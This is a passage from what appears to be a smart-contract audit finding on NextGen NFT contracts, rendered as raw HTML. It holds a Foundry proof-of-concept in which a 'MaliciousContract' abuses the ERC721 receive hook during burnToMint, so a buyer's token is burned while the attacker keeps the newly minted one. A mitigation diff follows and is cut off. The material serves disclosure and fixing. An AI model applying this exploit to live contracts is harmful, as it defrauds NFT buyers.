class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// _collectionArtistAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _maxCollectionPurchases</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionTotalSupply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// _setFinalSupplyTimeAfterMint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addMinterContract</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addRandomizer</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addRandomizer</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionCosts</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionMintCost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionEndMintCost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _rate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">5</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _timePeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _salesOptions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// delAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// 0x0000000000000000000000000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionCosts</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionMintCost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionEndMintCost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _rate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">5</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _timePeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _salesOptions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// delAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// 0x0000000000000000000000000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionPhases</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1696931278</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _allowlistStartTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1696931280</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _allowlistEndTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1696931282</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _publicStartTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1796931284</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _publicEndTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ) </span><span class=\"mtk3\">// _merkleRoot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionPhases</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1696931278</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _allowlistStartTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1696931280</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _allowlistEndTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1696931282</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _publicStartTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1796931284</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _publicEndTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ) </span><span class=\"mtk3\">// _merkleRoot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">[</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ] = </span><span class=\"mtk7\">0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initializeBurn</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Deploy a malicious contract to receive token 10000000000, later burn token 10000000000 to receive token 20000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MaliciousContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maliciousContract</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MaliciousContract</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr3</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1796931283</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Mint token 10000000000 to malicious contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _numberOfTokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _maxAllowance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&#39;{&quot;tdh&quot;: &quot;100&quot;}&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _tokenData</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maliciousContract</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// _mintTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _merkleRoot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// _delegator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//_varg0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Malicious contract approve to addr2 so addr2 can call burnToMint on behalf of the malicious contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maliciousContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approveToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burnToMint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000000000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk7\">20000000000</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maliciousContract</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// Malicious contract receives token 20000000000 after burnToMint.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr3</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// NFT of addr3 is burnt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MaliciousContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IERC721Receiver</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collection</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">admin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIdToBurn</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10000000000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIdToReceive</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">20000000000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collection</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_admin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collection</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_collection</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">admin</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_admin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">approveToken</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">NextGenCore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collection</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onERC721Received</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_operator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">tokenIdToBurn</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IERC721Receiver</span><span class=\"mtk1\">.</span><span class=\"mtk12\">onERC721Received</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">tokenIdToReceive</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// after receive the token, accept the sale offer immediately to send the token to buyer. To simplify, call transfer to the buyer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">NextGenCore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collection</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenIdToBurn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IERC721Receiver</span><span class=\"mtk1\">.</span><span class=\"mtk12\">onERC721Received</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</details>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The order of operations in the <code>burnToMint</code> function should be revised to ensure that the token is burned before a new one is minted:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        require(msg.sender == minterContract, &quot;Caller is not the Minter Contract&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        require(_isApprovedOrOwner(burner, _tokenId), &quot;ERC721: caller is not token owner or approved&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply &gt;= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-           _mintProcessing(mintIndex, ownerOf(_tokenId), 